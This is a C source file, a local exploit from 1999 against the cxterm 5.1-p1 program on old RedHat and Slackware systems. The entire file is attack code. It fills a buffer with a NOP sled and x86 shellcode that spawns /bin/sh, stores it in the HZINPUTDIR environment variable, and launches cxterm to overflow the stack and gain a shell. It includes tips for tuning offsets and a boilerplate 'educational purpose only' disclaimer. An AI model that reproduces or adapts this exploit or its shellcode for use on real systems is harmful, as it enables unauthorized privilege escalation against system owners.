/* Local exploit for cxterm 5.1-p1
 * Tested on:
 *           RedHat 5.2/6.0
 *           Slackware 3.6
 *
 * If it don't work,try  offset: 600 - 2500 (Don't change bufsize)
 *
 * (you should export your DISPLAY to X server in some host before run this)
 * WARNING:
 *   This code is for educational purpose only and should not be run in
 *   any host without permission from the system administrator.
 *                                      warning3@hotmail.com
 *                                            1999/08
 */

#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

#define DEFAULT_OFFSET                1000
#define DEFAULT_BUFFER_SIZE           4095
#define NOP		              0x90

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

long get_sp(void)
{
   __asm__("movl %esp, %eax\n");
}

int main(int argc, char *argv[]) {

  char *buff, *ptr;
  long addr,*addr_ptr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  int i,fd;

   if (argc > 1) offset=atoi(argv[1]);

   if(!(buff = malloc(bsize))) {
      printf("can't allocate memory\n");
      exit(0);
   }
   addr = get_sp() - offset;
   printf("Using address : 0x%x\n",addr);
   ptr = buff;
   addr_ptr=(long *)ptr;
   for (i = 0; i < bsize; i += 4)
            *(addr_ptr++) = addr;
   for (i = 0; i < (bsize/2); i++)
             buff[i] = NOP;
   ptr=buff + (bsize/2) - strlen(shellcode)/2;
   memcpy(ptr,shellcode,strlen(shellcode));
   buff[bsize-1]='\0';
   setenv("HZINPUTDIR", buff, 1);
   execl("/usr/X11R6/bin/cxterm","cxterm","-has","a", NULL);

}